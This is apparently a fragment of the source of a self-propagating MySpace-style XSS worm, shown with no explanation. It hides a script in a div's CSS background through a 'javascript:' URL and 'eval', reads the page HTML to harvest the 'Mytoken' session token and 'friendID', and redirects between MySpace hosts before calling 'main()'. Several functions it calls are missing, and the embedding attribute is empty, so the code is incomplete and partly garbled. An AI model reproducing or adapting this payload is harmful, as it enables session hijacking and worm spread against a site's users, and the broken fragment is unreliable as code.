
<div id="mycode" style="BACKGROUND: url('javascript:eval(document.all.mycode.expr)')" expr="

"/>

var B = String.fromCharCode(34);
var A = String.fromCharCode(39);

function g() {
    var C;
    try {
        var D = document.body.createTextRange();
        C = D.htmlText
    } catch (e) {}
    if (C) {
        return C;
    } else {
        return eval('document.body.inne' + 'rHTML')
    }
}

function getData(AU) {
    M = getFromURL(AU, 'friendID');
    L = getFromURL(AU, 'Mytoken');
}

function getQueryParams() {
    var E = document.location.search;
    var F = E.substring(1, E.length).split("&");
    var AS = new Array();
    for (var O = 0; O < F.length; O++) {
        var I = F[O].split("=");
        AS[I[0]] = I[1];
    }
    return AS;
}

var J;
var AS = getQueryParams();
var L = AS['Mytoken'];
var M = AS['friendID'];

if (location.hostname == 'profile.myspace.com') {
    document.location = 'http://www.myspace.com' + location.pathname + location.search;
} else {
    if (!M) {
        getData(g());
    }
    main();
}

function getClientFID() {
    return findIn(g(), 'up_launchIC( ' + A, A);
}